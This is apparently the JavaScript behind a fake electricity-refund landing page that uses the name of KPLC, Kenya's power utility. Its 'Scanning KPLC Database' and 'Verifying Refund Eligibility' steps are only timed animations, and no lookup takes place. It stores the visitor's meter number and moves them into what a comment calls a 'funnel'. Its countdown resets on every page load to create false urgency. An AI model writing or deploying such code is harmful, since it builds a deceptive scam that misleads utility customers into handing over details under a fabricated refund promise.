// Alpine.js component for refund checker landing page
function refundChecker() {
  return {
    meter: '',
    loading: false,
    step: '',
    currentStep: 0,
    stepTitle: '',
    stepSubtitle: '',
    stepIcon: '',
    progress: 0,
    checkEligibility() {
      console.log('Check eligibility clicked, meter:', this.meter);
      if (!this.meter || this.meter.length < 6) {
        alert('Please enter a valid meter number (6-8 digits)');
        return;
      }
      this.loading = true;
      this.step = 'processing';
      this.currentStep = 0;
      
      // Multi-step loading experience
      const steps = [
        {
          title: '🔍 Scanning KPLC Database',
          subtitle: 'Searching for your account details...',
          icon: 'search',
          duration: 2000
        },
        {
          title: '⚡ Analyzing Payment History',
          subtitle: 'Reviewing your electric bill payments...',
          icon: 'chart',
          duration: 2000
        },
        {
          title: '✅ Verifying Refund Eligibility',
          subtitle: 'Cross-checking system records...',
          icon: 'shield',
          duration: 1500
        }
      ];
      
      // Start the step progression
      this.animateSteps(steps);
    },
    
    animateSteps(steps) {
      const executeStep = (index) => {
        if (index >= steps.length) {
          // All steps complete, navigate to eligibility
          setTimeout(() => {
            this.loading = false;
            // Save meter to sessionStorage for funnel continuity
            sessionStorage.setItem('meterNumber', this.meter);
            console.log('Navigating to eligibility.html');
            window.location.href = 'eligibility.html';
          }, 500);
          return;
        }
        
        const step = steps[index];
        this.currentStep = index;
        this.stepTitle = step.title;
        this.stepSubtitle = step.subtitle;
        this.stepIcon = step.icon;
        
        // Progress bar animation
        this.progress = ((index + 1) / steps.length) * 100;
        
        setTimeout(() => executeStep(index + 1), step.duration);
      };
      
      executeStep(0);
    }
  }
}

// Countdown timer logic (2 days left)
function countdownTimer(daysLeft) {
  const deadline = new Date(Date.now() + daysLeft * 24 * 60 * 60 * 1000);
  return {
    timer: '',
    interval: null,
    update() {
      const now = new Date();
      const diff = deadline - now;
      if (diff <= 0) {
        this.timer = 'Refund period ended';
        clearInterval(this.interval);
        return;
      }
      const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
      const minutes = Math.floor((diff / (1000 * 60)) % 60);
      const seconds = Math.floor((diff / 1000) % 60);
      this.timer = `${hours}h ${minutes}m ${seconds}s`;
    },
    init() {
      this.update();
      this.interval = setInterval(() => this.update(), 1000);
    }
  }
}

// Make functions globally available for Alpine.js
window.refundChecker = refundChecker;
window.countdownTimer = countdownTimer;

console.log('Landing.js loaded successfully');
